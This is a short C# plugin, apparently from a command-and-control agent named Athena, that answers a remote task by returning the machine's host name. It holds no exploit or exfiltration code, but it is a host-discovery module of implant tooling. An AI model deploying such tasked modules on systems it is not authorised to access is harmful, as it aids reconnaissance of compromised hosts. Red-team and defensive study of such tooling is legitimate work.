using Athena.Models;
using Athena.Commands.Models;
using System;
using System.Collections.Generic;
using System.Net;
using Athena.Commands;
using Athena.Models.Responses;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class HostName : IPlugin
    {
        public string Name => "hostname";

        public bool Interactive => false;

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }

        public void Start(Dictionary<string, string> args)
        {
            TaskResponseHandler.AddResponse(new ResponseResult
            {
                completed = true,
                user_output = Dns.GetHostName(),
                task_id = args["task-id"],
            });
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }
    }
}
